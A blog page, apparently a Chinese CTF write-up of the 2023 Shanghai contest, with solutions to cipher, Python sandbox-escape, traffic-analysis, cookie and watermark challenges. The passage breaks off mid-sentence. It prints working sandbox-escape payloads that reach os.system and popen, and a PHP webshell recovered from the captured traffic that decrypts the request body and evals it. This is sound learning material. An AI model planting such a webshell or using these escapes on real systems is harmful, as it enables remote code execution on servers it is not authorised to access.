@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/05/31/security/ctf/2023上海市赛——psxd/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023上海市赛——PSXD">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/05/31/Security/CTF/2023%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E2%80%94%E2%80%94PSXD/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picturebed-1310517892.file.myqcloud.com/image-20230520165401366.png">
+<meta property="og:image" content="https://picturebed-1310517892.file.myqcloud.com/image-20230522221527402.png">
+<meta property="article:published_time" content="2023-05-30T17:20:00.000Z">
+<meta property="article:modified_time" content="2023-05-30T17:20:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picturebed-1310517892.file.myqcloud.com/image-20230520165401366.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2023上海市赛——PSXD -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail-3.jpg" alt="2023上海市赛——PSXD" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">2023上海市赛——PSXD</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-05-31 01:20</span>
+        <span class="mobile">2023-05-31 01:20</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-05-31 01:20</span>
+            <span class="mobile">2023-05-31 01:20</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Bird"><a href="#Bird" class="headerlink" title="Bird"></a>Bird</h2><p>bird图形密码：<a class="link"   target="_blank" rel="noopener" href="https://www.dcode.fr/birds-on-a-wire-cipher" >解密网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>解出来为大写的：<code>BIRDISLOVELY</code> 直接交不对，换成小写，成功：<code>flag&#123;birdislovely&#125;</code></p>
+<h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>exp1:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="built_in">getattr</span>(__ｉｍｐｏｒｔ__(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>), <span class="string">&quot;s&quot;</span><span class="string">&quot;y&quot;</span><span class="string">&quot;s&quot;</span><span class="string">&quot;t&quot;</span><span class="string">&quot;e&quot;</span><span class="string">&quot;m&quot;</span>)(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>exp2:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">st = <span class="string">&quot;po&quot;</span>+<span class="string">&quot;pen&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">str</span>(tmp[i])==<span class="string">&quot;&lt;class &#x27;collections.abc.Callable&#x27;&gt;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">137</span>].__init__.__globals__[st](<span class="string">&quot;cat ./flag&quot;</span>).read())</span><br></pre></td></tr></table></figure></div>
+
+<p>过滤了”open”，”import”等关键词，不能出现明文的敏感字，用字符串运算绕过，赋值给”st”变量</p>
+<p>由于不能直接搜索popen，搜索前一个得到索引为136，,给索引加一即可得到popen函数。利用基本的沙箱逃逸payload即可进行RCE</p>
+<h2 id="comlicated-http"><a href="#comlicated-http" class="headerlink" title="comlicated http"></a>comlicated http</h2><p>流量首先向index.php中上传了一个shell.php，接着利用该后门上传敏感数据，寻找与shell.php相关的流量，被加密的流量根据shell.php中的解密函数可以直接解密获得，传入的基本都是执行命令的脚本，将其执行的命令一起打出：</p>
+<p>shell.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;9d239b100645bd71&quot;</span>; </span><br><span class="line">    <span class="variable">$magicNum</span>=<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>,<span class="number">0</span>,<span class="number">2</span>))%<span class="number">16</span>; </span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)-<span class="variable">$magicNum</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>), <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$key</span>,OPENSSL_PKCS1_PADDING);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">Decrypt</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$post</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>本地用于测试的index.php：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;9d239b100645bd71&quot;</span>; </span><br><span class="line">    <span class="variable">$magicNum</span>=<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>,<span class="number">0</span>,<span class="number">2</span>))%<span class="number">16</span>; </span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)-<span class="variable">$magicNum</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>), <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$key</span>,OPENSSL_PKCS1_PADDING);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data1</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;shell&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$data2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;get: &lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">Decrypt</span>(<span class="variable">$data2</span>);</span><br><span class="line">    <span class="comment">// var_dump($post);</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// $moreCode = &quot;function Aecrypt(\$data)  \n&#123;  \n    \$key=\&quot;9d239b100645bd71\&quot;; \n    \$magicNum=hexdec(substr(\$key,0,2))%16; \n    \$data=substr(\$data,0,strlen(\$data)-\$magicNum);\n    return openssl_decrypt(base64_decode(\$data), \&quot;AES-128-ECB\&quot;, \$key,OPENSSL_PKCS1_PADDING);  \n&#125;;\necho 1;\n&quot;;</span></span><br><span class="line">    <span class="comment">// $moreCode = &quot;echo \&quot;abc\&quot;;\n&quot;;</span></span><br><span class="line">    <span class="variable">$moreCode</span> = <span class="string">&quot;\necho \&quot;\\n\&quot;.\$cmd;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;input: &lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">Decrypt</span>(<span class="variable">$data1</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$post</span>.<span class="variable">$moreCode</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>流量25000左右会有一个cat flag的命令，那么flag自然就藏在响应中。比较神奇的是响应中的flag加密内容藏在了”line-based text data”中，该内容在TCP追踪流中是不可见的，需要手动选取并复制。</p>
+<p>导出字节流可以直接得到有效字符串。直接复制粘贴进burp会有编码转换问题。<br>导出十六进制流后在010中直接修改16进制字节流也可以，得到的内容直接粘贴进burp即可。<br>但将有效内容粘贴进vsc中的文本中，会被vsc做编码处理，字符串会被篡改，依然不行。直接导出字节流用vsc打开并复制是可行的。<br>python中解码十六进制后打印出来，直接复制进burp也不行：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aa = <span class="string">&quot;5342556c486c42435149347135754158746f3461535a4759494a716467644f642f7a476654475a61526179734a5746646757646e6e7752543578376c2f62413670556f583870714a4e67734e697669754936616e66476764506a4e69506b6c336c34736555636551674f62393950774144394a4a776269612f35474877525461389e18a4f87015ce77ce20ac37&quot;</span></span><br><span class="line">ss = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">282</span>, <span class="number">2</span>):</span><br><span class="line"><span class="meta">... </span> hx = <span class="string">&quot;0x&quot;</span>+aa[i: i+<span class="number">2</span>]</span><br><span class="line"><span class="meta">... </span> ss+=<span class="built_in">chr</span>(<span class="built_in">int</span>(hx, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(ss)</span><br></pre></td></tr></table></figure></div>
+
+<p>利用burp传入加密数据时，用GET的参数传入会导致URL编码被解码，而从请求的body传入内容不会，后者才能被解码函数接收。</p>
+<h2 id="Cookieback"><a href="#Cookieback" class="headerlink" title="Cookieback"></a>Cookieback</h2><p>主页下的输入框怎么查询都查不出东西，也没看出Cookie的加密方式有什么可以破解的地方</p>
+<p>F12提示中发送data到cookie的意思是访问 <code>/cookie</code> 路由，参数是data，用Get方式可以传递数据。根据提示试着发送Cookie中connect.sid的值，发现没用。带上 <code>connect.sid=</code> 后发送成功，没反应，回退页面自动刷新发现flag：<code>flag&#123;31461e6c-efc2-474b-918e-e242d9bdfea2&#125;</code> </p>
+<h2 id="good-http"><a href="#good-http" class="headerlink" title="good_http"></a>good_http</h2><p>需要用到工具：<a class="link"   target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark" >盲水印 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>用盲水印解密得出水印图：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py bwmforpy3.py decode one.png theother.png out.png</span><br><span class="line">image&lt;one.png&gt; + image(encoded)&lt;theother.png&gt; -&gt; watermark&lt;out.png&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picturebed-1310517892.file.myqcloud.com/image-20230520165401366.png"
+                      alt="image-20230520165401366"
+                ></p>
+<p>010查看flag.zip文件，在最后提示密码长度为10，根据图中的K区分方向，勉强可以辨认出密码：</p>
